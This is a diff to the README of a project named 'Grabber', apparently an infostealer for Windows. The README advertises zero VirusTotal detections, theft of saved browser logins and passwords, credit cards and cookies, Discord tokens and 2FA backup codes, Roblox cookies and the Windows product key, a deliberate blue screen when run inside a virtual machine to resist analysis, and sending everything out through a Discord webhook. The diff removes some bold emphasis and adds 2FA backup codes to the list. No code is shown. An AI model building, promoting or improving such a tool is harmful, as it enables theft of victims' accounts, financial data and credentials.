@@ -15,7 +15,7 @@
 
 ## Functionalities
 
-Some of these functionalities are customisable in the [`config.js`](config.js) file. You can find more details in [the wiki](https://github.com/JustYuuto/Grabber/wiki/Functionalities). Items in bold are functionalities you can get hyped with!
+Some of these functionalities are customisable in the [`config.js`](config.js) file. You can find more details in [the wiki](https://github.com/JustYuuto/Grabber/wiki/Functionalities).
 
 * Made for Windows, but might work on macOS and Linux with Wine
 * Zero VirusTotal detections
@@ -25,10 +25,10 @@ Some of these functionalities are customisable in the [`config.js`](config.js) f
 * Can get OS info: RAM, OS version, computer name...
 * Can get Windows product key
 * Can kill Discord processes
-* **Can get Chrome-based browsers logins and passwords, credit cards, cookies, history** 
+* Can get Chrome-based browsers logins and passwords, credit cards, cookies, history
 * Can get Roblox login cookie
 * Can trigger a BSOD if the grabber is run from a virtual machine
-* **Can get Discord token** (killing the Discord client is not needed)
+* Can get Discord token, 2FA backup codes
 
 Everything is sent through a Discord Webhook.
 
